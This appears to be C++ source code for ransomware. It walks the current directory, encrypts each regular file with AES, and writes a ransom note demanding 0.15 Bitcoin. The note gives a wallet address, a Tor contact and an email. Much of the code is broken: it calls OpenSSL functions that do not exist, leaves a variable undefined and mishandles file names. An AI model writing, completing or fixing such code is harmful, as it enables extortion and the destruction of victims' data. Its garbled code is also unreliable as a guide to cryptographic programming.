#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <argparse/argparse.hpp>

#define AES_BLOCK_SIZE 16
#define ARG_PASSWORD "password"

static void derive_key(unsigned char *key, const char *password, const unsigned char *key_salt) {
    unsigned char hashed_key[32];
    EVP_BytesToKey(EVP_argon2i(), EVP_argon2i_id(), key_salt, (const unsigned char *)password, strlen(password), 2, 102400, 8, hashed_key, NULL, NULL);
    memcpy(key, hashed_key, 32);
}

static void encrypt_file(const char *key, const char *original_filename, const char *encrypted_filename) {
    std::ifstream original_file(original_filename, std::ios::binary);
    if (!original_file.is_open()) {
        std::cerr << "Error opening original file: " << original_filename << std::endl;
        return;
    }

    std::ofstream encrypted_file(encrypted_filename, std::ios::binary);
    if (!encrypted_file.is_open()) {
        std::cerr << "Error opening encrypted file: " << encrypted_filename << std::endl;
        original_file.close();
        return;
    }

    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_KEY aes_key;
    AES_set_encrypt_key(key, 256, &aes_key);

    unsigned char buffer[AES_BLOCK_SIZE];
    std::streamsize bytes_read;
    while (original_file.read(buffer, AES_BLOCK_SIZE) == AES_BLOCK_SIZE) {
        AES_crypt(buffer, buffer, &aes_key, AES_ENCRYPT);
        encrypted_file.write(reinterpret_cast<const char *>(buffer), AES_BLOCK_SIZE);
    }

    original_file.close();
    encrypted_file.close();
}

static void derive_encrypted_filename(const std::string &original_filename, std::string &encrypted_filename) {
    size_t pos = original_filename.find_last_of('/');
    if (pos == std::string::npos) {
        pos = 0;
    }
    encrypted_filename = original_filename.substr(pos);
    encrypted_filename += "_encrypted";
    encrypted_filename += original_filename.find_last_of('.');
}

static void create_ransom_note(const std::string &ransom_note_filename) {
    std::ofstream ransom_note(ransom_note_filename);
    if (!ransom_note.is_open()) {
        std::cerr << "Error creating ransom note: " << ransom_note_filename << std::endl;
        return;
    }

    const std::string address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    const std::string wallet_instruction = " (https://bitcoin.org for Bitcoin).\n";
    const std::string ransom_instruction =
        "============================================================================\n"
        "| WARNING!!! Your files have been encrypted. Releasing your files requires\n"
        "| the purchase of a unique decryptor. Please follow these instructions to\n"
        "| regain access to your files:\n"
        "| 1. Download and install a secure cryptocurrency wallet (e.g.,\n"
        "|     https://www.bitaddress.org/ for Bitcoin).\n"
        "| 2. Send the exact amount of 0.15 Bitcoins shown below to the following\n"
        "|     address within 72 hours:\n"
        "|     <BITCOIN_ADDRESS>\n"
        "| 3. After sending the payment, please message us through an anonymous\n"
        "|     communication method like \n"
        "|     - Tor network: http://nk7r4qenumge.onion/ \n"
        "|     - Pastebin: https://pastebin.com\n"
        "|     - Email (NOTE: this might take longer): hacked@mail.com \n"
        "|     Please include the Bitcoin transaction ID and provide any additional\n"
        "|     information about your encryption and system.\n"
        "| 4. If you wish to test the decryptor before purchasing, create an\n"
        "|     additional payment of 0.0005 Bitcoin to the same address within 72\n"
        "|     hours as well. This will send a test decryptor file to your\n"
        "|     inbox without modifying your original encrypted files.\n"
        "|     Please include this information in your message if you choose to\n"
        "|     test the decryptor first.\n"
        "| Attention: Do not attempt to modify or decrypt the files on your own,\n"
        "|            as this may result in permanent file loss.\n"
        "============================================================================\n";

    ransom_note << ransom_instruction << address << wallet_instruction;
}

int main(int argc, char *argv[]) {
    argparse::ArgumentParser parser("ransomware");
    parser.add_argument(ARG_PASSWORD);
    parser.parse_args(argc, argv);

    create_ransom_note(ransom_note_filename);

    for (const auto &entry : std::filesystem::directory_iterator(".")) {
        if (entry.is_regular_file() && entry.path() != ransom_note_filename) {
            std::string original_filename = entry.path().string();
            std::string encrypted_filename;
            derive_encrypted_filename(original_filename, encrypted_filename);

            if (entry.path() != encrypted_filename) {
                unsigned char key[32];
                unsigned char key_salt[16];
                RAND_bytes(key_salt, 16);
                derive_key(key, parser.get<std::string>(ARG_PASSWORD).c_str(), key_salt);

                encrypt_file(key, original_filename.c_str(), encrypted_filename.c_str());
            }
        }
    }

    return 0;
}